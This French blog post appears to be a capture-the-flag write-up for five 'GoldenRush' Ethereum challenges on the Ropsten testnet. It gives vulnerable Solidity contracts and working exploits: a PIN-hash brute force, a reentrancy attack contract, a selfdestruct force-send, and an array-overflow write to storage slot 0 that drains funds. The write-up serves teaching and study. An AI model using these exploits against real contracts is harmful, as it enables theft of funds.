---
layout: post
title: santhacklaus ctf v2
categories: linux
---
<!--more-->

<ul>
  <li><a href="#golden-rush">Golden Rush</a></li>
    <ul>
        <li><a href="#level-1---donation">Level 1 - Donation</a></li>
        <li><a href="#level-2---piggybank">Level 2 - PiggyBank</a></li>
        <li><a href="#level-3---gringotts">Level 3 - Gringotts</a></li>
        <li><a href="#level-4---wallstreet">Level 4 - WallStreet</a></li>
        <li><a href="#level-5---thevault">Level 5 - TheVault</a></li>
    </ul>
</ul>

---

# Golden Rush

---

**Catégorie**: Blockchain

**Description**:

GoldenRush is a set of challenges based on  the Ethereum Blockchain technology where you will have to exploit  vulnerable Smart Contracts. Your goal is to steal the money that I sent  on it !

https://goldenrush.santhacklaus.xyz

**Auteur**: Ch3n4p4N

---

## Introduction

### MetaMask

Pour réussir les challenges, il est nécessaire d'avoir l'extension [MetaMask](https://metamask.io/). Il faudra également créer un compte dans cette dernière.

MetaMask est un wallet de cryptomonaie Ethereum, on va utiliser ce dernier afin de réaliser des transactions. Chaque wallet possède un identifiant, cet identifiant est une suite hexadécimale.

```bash
# par exemple
0x7890720F3e2bA41d7447547Dd4004ed429E944a2
```
Cette adresse est par exemple nécessaire lorsque 2 personnes veulent réaliser une transaction.

### Ropsten Test Network

Par défaut, MetaMask utilise la blockchain **Ethereum** (appelé *mainnet*), nous n'allons pas travailler sur cette dernière puisque pour réaliser des transactions, nous avons besoin d'Ethereum que nous devons acheter. 

Il existe alors une autre blockchain appelée **Ropsten Test Network** (ou *testnet*), cette dernière est par exemple utilisée pendant des phases de développement afin de tester du code avant la mise en production dans la mainnet. Tous les ethers (unité de cette blockchain) que l'on peut avoir n'ont aucune valeur, c'est simplement une simulation pour réaliser des tests. Il faut donc **switcher sur le réseau Ropsten Test Network** sur MetaMask.

### Remplir son wallet

Il faut maintenant remplir son wallet avec quelques ethers. Pour cela, on peut utiliser un [faucet](https://faucet.metamask.io/). Il faut alors appuyer sur **request 1 ether from faucet**, lors de la première visite, il faudra accepter de connecter son compte MetaMask au site du faucet. Récupérer 2 ou 3 Ether est suffisant pour réussir les challenges.

### Liens utiles

* [Etherscan](https://ropsten.etherscan.io/): c'est un **exploreur du réseau Ropsten**, il permet de suivre des transactions, des smarts contrats et des comptes, le vrai réseau Ethereum est [ici](https://etherscan.io/).
* [Remix](https://remix.ethereum.org/): c'est un IDE Ethereum, ou l'on va écrire notre code en langage Solidity.
* [Smart contract avec Remix](https://medium.com/coinmonks/write-a-simple-contract-on-top-of-ethereum-92b543594e84): exemple d'un smart contract.
* [Remix documentation](https://remix-ide.readthedocs.io/en/latest/index.html): documentation.
* [Video de writups](https://www.youtube.com/watch?v=RHh1qSx7v6w)

### Remarques

L'interface graphique de Remix IDE ayant changé récemment, le compiler et le runner ne sont plus disponibles par défaut. Il faudra alors installer le **Solidity compiler** ainsi que **Deploy & run transactions**, pour cela, il faut utiliser le **Plugin manager** pour les installer (logo d'une prise à gauche).

### Communiquer avec un smart contract

Nous allons utiliser une **console JavaScript** pour communiquer avec les smart contracts. Avant cela, il faut autoriser le domaine sur lequel on veut travailler à utiliser notre compte MetaMask. Pour cela, allez dans l'extension MetaMask, cliquer sur le cercle en haut à droite, Paramètres (ou Settings), Connections puis Connect.

Lancez alors une console JavaScript. Pour tester que votre compte MetaMask est accessible:

```js
web3.eth.accounts[0];
--> "0x7890720f3e2ba41d7447547dd4004ed429e944a2"

var me = web3.eth.accounts[0];
```

Vous devriez alors obtenir l'adresse de votre wallet MetaMask. On va definir une variable `me` contenant notre adresse de wallet.

```js
var abi = [{ "constant": false, ... }]; // ABI
var contractAddr = "0x57A10FC74a52afDE6674C3DE0761ed021d4534f7"; // adresse d'instance
var contract = web3.eth.contract(abi).at(contractAddr);
```

Sur la page du challenge, après avoir cliqué sur `New Instance`et après quelques secondes, une adresse d'instance et un ABI sont fournis. La variable `contract`va nous permettre de communiquer avec notre smart contract.

### Objectif

Le but des 5 challenges est de voler les ethers de chaque contrat deployé.

# Level 1 - Donation

**Points**: 100

---

```js
pragma solidity >=0.4.22 <0.6.0;

contract Donation {
  uint256 public funds;
  
  constructor() public payable {
    funds = funds + msg.value;
  }

  function() external payable {
    funds = funds + msg.value;
  }

  function getDonationsFromOwner(address _contractOwner) external {
    require(keccak256(abi.encodePacked(address(this)))==keccak256(abi.encodePacked(_contractOwner)));
    msg.sender.transfer(funds);
    funds = 0;
  }
}
```

## Analyse

```js
pragma solidity >=0.4.22 <0.6.0;
```

La version de Solidity à utiliser pour la compilation, ici, doit être supérieur ou égale à `0.4.22`et inférieur à `0.6.0`.

```js
contract Donation {
  ...
}
```

Le squelette d'un smart contract appelé `Donation`.

```js
uint256 public funds;
```

`funds`:

* un unsigned int de 256 bits (32 octets)
* public, donc accessible depuis l'extérieur

```js
constructor() public payable {
  funds = funds + msg.value;
}
```

Constructeur de notre smart contract, **appelé une et une seule fois** lors du déploiement sur la blockchain. Ce dernier initialise `funds` à la quantité `msg.value`, cette dernière est la quantité d'ether de la transaction pour le déploiement.

> * [Units and Globally Available Variables](https://solidity.readthedocs.io/en/v0.4.24/units-and-global-variables.html)
> * `msg.value` (`uint`): number of wei sent with the message.

```js
function() external payable {
  funds = funds + msg.value;
}
```

C'est la **fallback function**, de ce smart contract. Une fallback function est une fonction qui n'a pas de nom, il y en a au maximum une dans un smart contract. Elle est appelée en cas d'erreur dans une transaction ou lorsque l'on envoie des ethers au contrat. Dans notre cas, elle se charge simplement d'ajouter les nouveaux fonds que l'on a envoyés dans la transaction.

```js
function getDonationsFromOwner(address _contractOwner) external {
  require(keccak256(abi.encodePacked(address(this))) == keccak256(abi.encodePacked(_contractOwner)));
  msg.sender.transfer(funds);
  funds = 0;
}
```

Fonction qui prend une adresse en paramètre, peut être appelée de l'extérieur (`external`).

Informations:

* `adresse(this)`: adresse de l'instance du smart contract
* `abi.encodePacked()`: peu importante, utilisé pour de l'encodage
* `keccack256()`:  fonction de hachage (SHA3)
* `require(a == b)`: condition doit être vérifiée pour continuer l'exécution du code
* `msg.sender.transfer(funds)`: envoyer tous les `funds`à l'expéditeur ( `msg.sender`)

> `msg.sender` (`address`): sender of the message (current call)

#### Communiquer avec notre smart contract

```js
var abi = [{ "constant": false, ... }]; // ABI
var contractAddr = "0x57A10FC74a52afDE6674C3DE0761ed021d4534f7"; // adresse d'instance
var contract = web3.eth.contract(abi).at(contractAddr);
```

```js
contract.funds((err,res)=>{console.log(err,res);});
--> 100
```

Pour accéder à des champs publiques, on faut simplement appeler `contract.champ()`. Ci-dessus, on accède au champ `funds`, on peut voir que sa valeur est de `100`.

> PS1: Il faudra toujours ajouter en dernier paramètre, une fonction de callback : `(err,res)=>{console.log(err,res);}`.
>
> PS2: La réponse est un object, il faut déplier ce dernier et regardé le contenu du tableau `c`.

```js
// faire une transaction avec 0.0002 ether
web3.eth.sendTransaction({from:me, to:contractAddr, value:web3.toWei(0.0002)}, (err,res)=>{console.log(err,res);})

contract.funds((err,res)=>{console.log(err,res);});
--> 102
```

> `from`: source (adresse de notre wallet)
>
> `to`: destination (adresse du smart contract)
>
> `value`: quantité d'ether, va correspondre à `msg.value`

On peut voir que le solde est passé de `100`à `102`.

## Attack

Il est facile de comprendre que la fonction importante dans ce smart contract est `getDonationsFromOwner()`.

```js
function getDonationsFromOwner(address _contractOwner) external {
  require(keccak256(abi.encodePacked(address(this))) == keccak256(abi.encodePacked(_contractOwner)));
  msg.sender.transfer(funds);
  funds = 0;
}
```

C'est cette dernière qui réalise le transfert de tous les fonds à l'expéditeur d'une transaction (`msg.sender`). Pour faire cela, il faut que la condition du `require()` soit vraie.

```js
require(keccak256(abi.encodePacked(address(this))) == keccak256(abi.encodePacked(_contractOwner)));
```

Il faut que le paramètre `_contractOwner`, soit égale à `address(this)`. Le `this`correspond au smart contract lui-même. Le `address(this)` correspond alors à l'adresse du smart contract. Nous connaissons déjà cette adresse puisqu'elle est donnée dans le challenge.

> Autre moyen de la retrouver:
>
> ```js
> contract.address
> --> "0x57A10FC74a52afDE6674C3DE0761ed021d4534f7"
> ```

```js
// avant
contract.funds((err,res)=>{console.log(err,res);});
--> 102

// payload
contract.getDonationsFromOwner("0x57A10FC74a52afDE6674C3DE0761ed021d4534f7",(err,res)=>{console.log(err,res);});

// après
contract.funds((err,res)=>{console.log(err,res);});
--> 0
```

> Il faut patienter quelques secondes avant que la transaction soit validée (attendre la notification de MetaMask).

Le smart contract a été dépouillé. On peut alors récupérer notre flag en appuyant sur Check.

`SANTA{!!S0Lidi7y_BaSiCs!!}`

# Level 2 - PiggyBank

**Points**: 200

---

```js
pragma solidity ^0.4.21;

contract PiggyBank {
    bool public isOwner = false;
    uint256 public funds;
    bytes32 private pinHash = 0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c;
    
    constructor() public payable {
        funds = funds + msg.value;
    }
    
    function() external payable {
        funds = funds + msg.value;
    }
    
    function unlockPiggyBank(uint256 pin) external {
        if((keccak256(abi.encodePacked(uint8(pin))) == pinHash)){
        isOwner = true;
        }    
    }

    function withdrawPiggyBank() external {
        require(isOwner == true);
        msg.sender.transfer(funds);
        isOwner = false;
        funds = 0;
    }
}
```

## Analyse

```js
contract PiggyBank {
	...
}
```

On travail maintenant sur le smart contract `PiggyBank`.

```js
bool public isOwner = false;
uint256 public funds;
bytes32 private pinHash = 0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c;
```

Ce dernier possède 4 champs:

* `isOwner`: boolean initialisé à `false` qui est publique
* `funds`: unsigned int de 256 bits (32 octets) qui est public
* `pinHash`: le hash d'un code pin ? qui est privé

```js
constructor() public payable {
  funds = funds + msg.value;
}
```

Le constructeur qui va initialiser le variable `funds` à la quantité d'ether de la première transaction du propriétaire (`msg.value`).

```js
function() external payable {
  funds = funds + msg.value;
}
```

La **fallback function** qui met à jour la valeur de `funds` en fonction de `msg.value`.

```js
function unlockPiggyBank(uint256 pin) external {
  if((keccak256(abi.encodePacked(uint8(pin))) == pinHash)){
    isOwner = true;
  }    
}
```

Fonction `unlockPiggyBank()` qui prend en paramètre un `uint256`, appellable seulement depuis l'extérieur (`external`). Le champ `pinHash` doit être égale au haché de notre input `pin`pour rentrer dans le `if`. Si c'est le cas, `isOwner` passe à `true`.

> [Ressource](https://ethereum.stackexchange.com/questions/19380/external-vs-public-best-practices)
>
> `public`: all can access
>
> `external`: cannot be accessed internally, only externally
>
> `internal`: only this contract and contracts deriving from it can access
>
> `private`: can be accessed only from this contract

```js
function withdrawPiggyBank() external {
  require(isOwner == true);
	msg.sender.transfer(funds);
  isOwner = false;
  funds = 0;
}
```

Fonction `withdrawPiggyBank()`, ne prend pas de paramètre, accessible seulement depuis l'extérieur. Cette fonction transfert les `funds`à l'émetteur de la transaction (`msg.sender.transfer(funds);`). Pour pouvoir exécuter cette fonction, il faut respecter le `require(isOwner == true)`.

## Attack

```js
function unlockPiggyBank(uint256 pin) external {
  if((keccak256(abi.encodePacked(uint8(pin))) == pinHash)){
    isOwner = true;
  }    
}
```

On comprend rapidement que la fonction à attaquer est `unlockPiggyBank()`. Il faut fournir la bonne valeur de `pin`qui donne le haché `pinHash`(ou `0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c`).

```js
keccak256(abi.encodePacked(uint8(pin))) == pinHash
```

En lisant la condition, on peut voir que notre `pin` de type `uint256` est convertit en `uint8` avant d'être haché. On passe alors d'une valeur de 256 bits à une valeur de 8 bits. Il n'y a alors que `2**8 = 256` possibilités.

On peut utiliser ce code python pour tester tous les hachés possibles sur 8 bits.

```python
#!/usr/bin/env python3

from Crypto.Hash import keccak

for pin in range(256):
    h = keccak.new(digest_bits=256).update(bytes([pin])).hexdigest()
    if h == '7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c':
        print(f'[+] pin -> {pin}')
        break
# [+] pin -> 213
```

La valeur 213 donne bien le bon haché !!

```js
var abi = [{ "constant": true, ... }]; // ABI
var contractAddr = "0x288F068cdae9008944a03a3e7061650046734dC8"; // adresse d'instance
var contract = web3.eth.contract(abi).at(contractAddr);
```

On créer notre "connexion" au smart contract.

```js
contract.isOwner((err,res)=>{console.log(err,res);});
--> false

contract.funds((err,res)=>{console.log(err,res);});
--> 100
```

La valeur de `isOwner` est bien `false`, et les fonds disponibles sont de `100`.

```js
// avant
contract.isOwner((err,res)=>{console.log(err,res);});
--> false

// mettre isOwner à true
contract.unlockPiggyBank("213",(err,res)=>{console.log(err,res);});

// après
contract.isOwner((err,res)=>{console.log(err,res);});
--> true
```

On commence par mettre `isOwner` à `true` en utilisant `unlockPiggyBank()` avec `213` comme paramètre.

```js
contract.funds((err,res)=>{console.log(err,res);});
--> 100

// dépouiller
contract.withdrawPiggyBank((err,res)=>{console.log(err,res);});

contract.funds((err,res)=>{console.log(err,res);});
--> 0
```

Et on appelle `withdrawPiggyBank()`pour récupérer les fonds. Le smart contract a été dépouillé. On peut alors récupérer notre flag en appuyant sur Check.

`SANTA{N0_M0R3_B4D_R4ND0MN3SS_PL3AZ}`

# Level 3 - Gringotts

**Points**: 300

---

```js
pragma solidity >=0.4.22 <0.6.0;

contract Gringotts {
  mapping (address => uint) public sorceryAllowance;
  uint public allowancePerYear;
  uint public startStudyDate;
  uint public numberOfWithdrawls;
  uint public availableAllowance;
  bool public alreadyWithdrawn;
    
    constructor() public payable {
        allowancePerYear = msg.value/10;     
        startStudyDate = now;
        availableAllowance = msg.value;
    }

    modifier isEligible() {
        require(now>=startStudyDate + numberOfWithdrawls * 365 days);
        alreadyWithdrawn = false;
        _;
    }

    function withdrawAllowance() external isEligible{
        require(alreadyWithdrawn == false);
        if(availableAllowance >= allowancePerYear){
         if (msg.sender.call.value(allowancePerYear)()){
            alreadyWithdrawn = true;
         }
        numberOfWithdrawls = numberOfWithdrawls + 1;
        sorceryAllowance[msg.sender]-= allowancePerYear;
        availableAllowance-=allowancePerYear;
        }
    }

  function donateToSorcery(address sorceryDestination) payable public{
    sorceryAllowance[sorceryDestination] += msg.value;
  }

  function queryCreditOfSorcery(address sorcerySource) view public returns(uint){
    return sorceryAllowance[sorcerySource];
  }
}
```

## Analyse

```js
contract Gringotts {
  ...
}
```

Notre smart contract s'appelle `Gringoots`.

```js
mapping (address => uint) public sorceryAllowance;
uint public allowancePerYear;
uint public startStudyDate;
uint public numberOfWithdrawls;
uint public availableAllowance;
bool public alreadyWithdrawn;
```

Il possède plusieurs champs, dont un tableau associatif `sorceryAllowance`, qui fait correspondre à une `address` à un `uint`.

> Exemple:
>
> ```bash
> sorceryAllowance[0x123] = 0x21
> sorceryAllowance[0x321] = 0x98
> sorceryAllowance[0x213] = 0x23
> ```

```js
constructor() public payable {
  allowancePerYear = msg.value/10;     
  startStudyDate = now;
  availableAllowance = msg.value;
}
```

Le constructeur qui initialise différentes variables lors de la création du smart contrat.

```js
modifier isEligible() {
  require(now >= startStudyDate + numberOfWithdrawls * 365 days);
  alreadyWithdrawn = false;
  _;
}
```

> `now` (`uint`): current block timestamp (alias for `block.timestamp`)

On retrouve également ce que l'on appelle un **modifier**. On défini ce code comme des contraintes ou des conditions à respecter lors de l'appel à une fonction.

```js
require(now >= startStudyDate + numberOfWithdrawls * 365 days);
alreadyWithdrawn = false;
_;
```

Dans cet exemple, pour exécuter `alreadyWithdrawn = false;`, il faut d'abord que la condition du `require()` soit vérifiée.

```js
function withdrawAllowance() external isEligible {
  require(alreadyWithdrawn == false);
  if(availableAllowance >= allowancePerYear){
    if (msg.sender.call.value(allowancePerYear)()){
      alreadyWithdrawn = true;
    }
    numberOfWithdrawls = numberOfWithdrawls + 1;
    sorceryAllowance[msg.sender]-= allowancePerYear;
    availableAllowance-=allowancePerYear;
  }
}
```

La fonction `withdrawAllowance()` utilise le modifier `isEligible()` précédent. Cette fonction permet de demander une `allowancePerYear` au smart contract. On ne peut appeler cette fonction, qu'une seule fois par an car c'est le modifieur qui choisis de mettre à jour `alreadyWithdrawn`à `false`ou non.

```js
function donateToSorcery(address sorceryDestination) payable public{
  sorceryAllowance[sorceryDestination] += msg.value;
  }

function queryCreditOfSorcery(address sorcerySource) view public returns(uint){
  return sorceryAllowance[sorcerySource];
}
```

Ces 2 dernières fonctions permettent de faire un don à une adresse précise et de connaître le solde d'ether d'une adresse précise.

Pour commencer, nous allons utiliser le smart contract d'une manière normale.

```js
var abi = [{ "constant": true, ... }]; // ABI
var contractAddr = "0x8B1A677d85cd44afd3878E9201e7eff27e397421"; // adresse d'instance
var contract = web3.eth.contract(abi).at(contractAddr);
```

On crée notre "connexion" au smart contract.

```js
contract.allowancePerYear((err,res)=>{console.log(err,res);});
--> 10

contract.startStudyDate((err,res)=>{console.log(err,res);});
--> 1577111586 // Mon Dec 23 2019 15:33:06

contract.numberOfWithdrawls((err,res)=>{console.log(err,res);});
--> 0

contract.availableAllowance((err,res)=>{console.log(err,res);});
--> 100

contract.alreadyWithdrawn((err,res)=>{console.log(err,res);});
--> false
```

On récupère les valeurs de toutes les variables. On comprend alors qu'une quantité de `100`est disponible, et que cette dernière est distribuée par morceaux de `10`.

Essayons alors de récupérer une part:

```js
// solde
contract.availableAllowance((err,res)=>{console.log(err,res);});
--> 100

// récupérons une part
contract.withdrawAllowance((err,res)=>{console.log(err,res);});

// solde
contract.availableAllowance((err,res)=>{console.log(err,res);});
--> 90
```

Le solde a bien diminué, il est passé de `100` à `90`, on a retiré une part.

```js
contract.numberOfWithdrawls((err,res)=>{console.log(err,res);});
--> 1

contract.alreadyWithdrawn((err,res)=>{console.log(err,res);});
--> true
```

Le nombre de retraits a été incrémenté, et `alreadyWithdrawn`est passé à `true`.

La seule manière de redemander une part est de remettre `alreadyWithdrawn` à `false`.

Pour cela, il faut respecter la condition suivante:

```js
require(now >= startStudyDate + 1 * 365 days);
```

Il faut donc patienter un an...

## Attack

La seule fonction que nous pouvons attaquer est `withdrawAllowance()`. Les fonctions `donateToSorcery()`et `queryCreditOfSorcery()`ne faisant pas grand chose d'intéressant.

```js
function withdrawAllowance() external isEligible {
  require(alreadyWithdrawn == false);
  if(availableAllowance >= allowancePerYear){
    if (msg.sender.call.value(allowancePerYear)()){
      alreadyWithdrawn = true;
    }
    numberOfWithdrawls = numberOfWithdrawls + 1;
    sorceryAllowance[msg.sender]-= allowancePerYear;
    availableAllowance-=allowancePerYear;
  }
}
```

On ne peut pas attaquer le `require()`, la condition `availableAllowance >= allowancePerYear`, n'est pas un problème. On peut commencer à chercher sur `msg.sender.call.value(allowancePerYear)()`.

En cherchant sur Google: `msg.sender.call.value`. On tombe sur la vulnérabilité Re-Entrancy.

> * [Security Considerations - Re-Entrancy](https://solidity.readthedocs.io/en/v0.6.0/security-considerations.html#re-entrancy)
>* [Re-entrancy Attacks](https://hackernoon.com/smart-contract-security-part-1-reentrancy-attacks-ddb3b2429302)
> * [Known Attacks](https://consensys.github.io/smart-contract-best-practices/known_attacks/)
> * [Example Of An Attack Contract](https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4)

Voici le code de l'attaque:

> Il faut penser à recréer une nouvelle instance du challenge, car la précédente est bloquée, `alreadyWithdrawn` étant à `true`.

```js
pragma solidity >=0.4.22 <0.6.0;

contract Gringotts {
  // tous le code du contrat
}

contract Attack {
    
  	address target = 0xb5718566197aB563FF468e03D6B9eb6F76627cF0; // adresse de la nouvelle instance du smart contract
    Gringotts public g;
    
    constructor() public {
        g = Gringotts(target);
    }
   
    function collect() payable public {
        g.donateToSorcery.value(msg.value)(this);
        g.withdrawAllowance();
    }
    
    function kill() public {
        selfdestruct(msg.sender);
    }

    function () payable public {
        if (address(g).balance >= msg.value) {
            g.withdrawAllowance();
        }
    }
}
```

* le constructeur va initialiser notre smart contrat déjà existant qui se trouve à l'adresse `target`.

* `collect()` va mettre en place l'attaque Re-Entrancy.

* la fallback function sera exécutée tant qu'il y a encore des ethers a dérober.

* `kill()`va detruire le smart contract `Attack`et envoyer les ethers au créateur de la transaction.

> [Introduction to Smart Contracts](https://solidity.readthedocs.io/en/v0.4.21/introduction-to-smart-contracts.html)
>
> The only possibility that code is removed from the blockchain is when a contract at that address performs the `selfdestruct` operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state. 

Pour mettre en place l'attaque, nous allons utiliser [Remix](https://remix.ethereum.org), créer par exemple le fichier `Attack.sol`, y mettre tout le code précédent, le compiler. Déployer ensuite une instance de `Attack.sol` dans l'environnement `Injected Web3`. Patienter, et lancer la méthode `collect()` afin que notre instance de `Attack.sol`dérobe tout les ethers, attendre la fin de la transaction. Puis `kill()` pour récupérer ce que l'on vient de dérober dans notre wallet.

```js
contract.availableAllowance((err,res)=>{console.log(err,res);});
--> 0
```

Après l'attaque, tous les ethers sont récupérés depuis le smart contract. On demande alors le flag.

`SANTA{R3eN7r4ncY_f0r_Th3_WiN}`

# Level 4 - WallStreet

**Points**: 400

---

```js
contract WallStreet {
    uint256 stockExchangeAmount;
    address contractOwner = msg.sender;
    uint256 collectFundsDate = now + 14600 days;
    uint256 lostMoneyAmount;

    constructor() public payable {
        stockExchangeAmount = msg.value;
    }
    
    function receiveMoneyAmount() public {
        require(stockExchangeAmount - address(this).balance > 0);
        msg.sender.transfer(address(this).balance);
    }

    function withdrawMoney() public {
        require(msg.sender == contractOwner);
        if (now < collectFundsDate) {
            uint256 lostClientMoney = address(this).balance / 2;
            lostMoneyAmount = lostMoneyAmount + lostClientMoney;
            msg.sender.transfer(address(this).balance - lostClientMoney);
        } else {
            msg.sender.transfer(address(this).balance + 100 ether);
        }
    }
    
    function getStockExchangeAmount() public view returns (uint256 amount) {
        return stockExchangeAmount;
    }
    
    function dateOfCollection() public view returns (uint256 date) {
        return collectFundsDate;
    }
}
```

## Analyse

```js
function withdrawMoney() public {
  require(msg.sender == contractOwner);
  if (now < collectFundsDate) {
    uint256 lostClientMoney = address(this).balance / 2;
    lostMoneyAmount = lostMoneyAmount + lostClientMoney;
    msg.sender.transfer(address(this).balance - lostClientMoney);
  } else {
    msg.sender.transfer(address(this).balance + 100 ether);
  }
}
```

Pas besoin de comprendre ce que fait exactement cette fonction. On sait juste qu'elle envoi des ethers,   mais seulement au propriétaire (`contractOwner`) du smart contract.

```js
function getStockExchangeAmount() public view returns (uint256 amount) {
  return stockExchangeAmount;
}
    
function dateOfCollection() public view returns (uint256 date) {
  return collectFundsDate;
}
```

`getStockExchangeAmount()`et `dateOfCollection()`sont des accesseurs.

```js
var abi = [{ "constant": true, ... }]; // ABI
var contractAddr = "0x93202aaa272f2eBd6DEC0e32864f943C4A7d3CF0"; // adresse d'instance
var contract = web3.eth.contract(abi).at(contractAddr);
```

```js
contract.getStockExchangeAmount((err,res)=>{console.log(err,res);});
--> 100

contract.dateOfCollection((err,res)=>{console.log(err,res);});
--> 2838556020
```

## Attack

Ici, l'attaque à mettre en place est `selfdestruct()`, qui va nous permettre de récupérer les ethers du smart contract.

> * [Self Destruct / Suicide](https://hackernoon.com/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148)
> * [Retirement Fund](https://medium.com/coinmonks/smart-contract-exploits-part-2-featuring-capture-the-ether-math-31a289da0427)
> * [Fallback function](https://solidity.readthedocs.io/en/v0.4.24/contracts.html#fallback-function)

```js
pragma solidity ^0.4.24;

contract Attack {
    constructor() public payable {
        require(msg.value == 1.1 ether);
    }
    
    function kill() public {
        selfdestruct(address(0x6f7b35Bcf2f96F4EECF7121A8d4d6CE4E74497eC));
    }
}
```

On va passer en paramètre de `selfdestruct()`, l'adresse du smart contract.

```js
contract.receiveMoneyAmount((err,res)=>{console.log(err,res);});
```

On peut alors récupérer les fonds en appelant le fonction `receiveMoneyAmount()`.

On demande alors la flag.

`SANTA{¡¡0v3rFl0ws_4r3_Ins4N3!!}`

# Level 5 - TheVault

**Points**: 500

---

```js
pragma solidity >=0.4.17 <0.6.0;

contract TheVault {
    uint256 public moneyAmount;
    uint256[] savingAccounts;
    
    constructor() public payable{
        moneyAmount = 0;
    }
    
    function putMoneyOnAccount(uint256 accountNumber, uint256 moneyQuantity) public {
        if (savingAccounts.length <= accountNumber) {
            savingAccounts.length = accountNumber + 1;
        }
        savingAccounts[accountNumber] = moneyQuantity;
    }
    
    function withdrawMoneyFromAccount(uint256 accountNumber) public {
        require(moneyAmount >= 2000000 && savingAccounts[accountNumber] >= 1);
        msg.sender.transfer(address(this).balance);
    }

    function getMoneyFromAccount(uint256 accountNumber) public view returns (uint256) {
        return savingAccounts[accountNumber];
    }
}
```

Notre objectif dans ce code est d'exécuter la fonction `withdrawMoneyFromAccount()`. Le problème est que le `require()` qui se trouve à l'intérieur nous oblige à avoir `moneyAmount >= 2000000`, alors que `moneyAmount` n'est jamais modifié, il vaut par défaut `0`.

#### Comment fonctionne l'allocation de la mémoire dans les smart constracts ?

> * [Ethereum Smart Contract Storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)

Le tableau `savingAccounts`stock sa taille dans le slot 1.

```bash
$ myth read-storage --rpc infura-ropsten 1 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
1: 0x0000000000000000000000000000000000000000000000000000000000000000
```

> [Mythril](https://github.com/ConsenSys/mythril)
>
> ```bash
> Usage: $ myth read-storage --rpc infura-ropsten slot_number contract_addr
> ```

Pour le moment, le table est vide. Essayons d'ajouter un élément avec la fonction `putMoneyOnAccount()`.

```js
var abi = [ { "constant": true, ... } ]; // ABI
var contractAddr = "0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5"; // adresse d'instance
var contract = web3.eth.contract(abi).at(contractAddr);
```

```js
// compte vide
contract.getMoneyFromAccount("0x123", (err,res)=>{console.log(err,res);});
--> 0

// on ajoute une quantité de 0x16 à savingAccounts[0x123]
contract.putMoneyOnAccount("0x123", "0x16", (err,res)=>{console.log(err,res);});

// on retrouve ce que l'on a ajouté
contract.getMoneyFromAccount("0x123", (err,res)=>{console.log(err,res);});
--> 22
```

La taille en slot 1 a-t-elle changé ?

```bash
$ myth read-storage --rpc infura-ropsten 1 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
1: 0x0000000000000000000000000000000000000000000000000000000000000124
```

```js
if (savingAccounts.length <= accountNumber) {
  savingAccounts.length = accountNumber + 1;
}
```

Ce code a donc bien été exécutée, la taille vaut bien `0x124`.

D'après les ressources précédentes, on peut retrouver le numéro de slot ou est stocké notre `0x16`.

```bash
keccak256(abi.encodePacked(uint256(1))) + 0x123
```

* `keccak256(abi.encodePacked(uint256(1)))`: adresse du premier élément du tableau (`savingAccounts[0]`)
* `0x123`: décalage par rapport à la première case du tableau

On trouve alors `80084422859880547211683076133703299733277748156566366325829078699459944779289`.

```js
$ myth read-storage --rpc infura-ropsten 80084422859880547211683076133703299733277748156566366325829078699459944779289 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5

80084422859880547211683076133703299733277748156566366325829078699459944779289: 0x0000000000000000000000000000000000000000000000000000000000000016
```

On retrouve bien le `0x16` que nous avons envoyé tout à l'heure.

## Attack

> * [Array overflow](https://ethereum.stackexchange.com/questions/70409/solidity-array-overflow)
> * [Vehicle Registration System](https://medium.com/@iphelix/chain-heist-writeup-4f008cd6d346)

Notre but va être de localiser la position du slot 0, étant donné que c'est ce dernier qui contient la valeur de `moneyAmount`, qui je le rappelle vaut 0 pour le moment. Pour cela, nous allons faire un array overflow.

```js
moneyAmount >= 2000000 
```

Le but de cette modification est de bypass le require de la fonction `withdrawMoneyFromAccount()`.

D'après les ressources, on peut avoir accès en écriture au slot 0 à `savingAccounts[2**256 - keccak256(abi.encodePacked(uint256(1)))]`.

On trouve alors `4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a`.

Essayons alors d'écrire `0x456` à cet index. 

```bash
# valeur de moneyAmount
$ myth read-storage --rpc infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
0: 0x0000000000000000000000000000000000000000000000000000000000000000
```

```js
contract.putMoneyOnAccount("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", "0x456", (err,res)=>{console.log(err,res);});
```

```bash
# valeur de moneyAmount
$ myth read-storage --rpc infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
0: 0x0000000000000000000000000000000000000000000000000000000000000456
```

> ```js
> contract.moneyAmount((err,res)=>{console.log(err,res);});
> --> 1110
> ```
>
> On peut aussi faire l'appel directement dans la console Javascript étant donné que `moneyAmount`est un champ public.

La valeur de `moneyAmount`est bien passée de `0` à `0x456`. Modifions encore cette valeur pour passer le require.

```js
contract.putMoneyOnAccount("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", "0xffffffff", (err,res)=>{console.log(err,res);});
```

```bash
$ myth read-storage --rpc infura-ropsten 0 0xde89B12A8c06e608D99d4C4d2a98708F984Ed0a5
0: 0x00000000000000000000000000000000000000000000000000000000ffffffff
```

Enfin pour respecter la seconde condition du require, nous devons appeler le fonction `withdrawMoneyFromAccount` avec en paramètre un numéro de compte qui respecte cette condition: `savingAccounts[accountNumber] >= 1`, on peut réutiliser l'adresse du slot 0, cela a peu d'importance.

```js
contract.withdrawMoneyFromAccount("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", (err,res)=>{console.log(err,res);});
```

On peut alors récupérer le flag.

`SANTA{Y0u_Fin4lLy_DiD_i7!!!}`

# Remarques

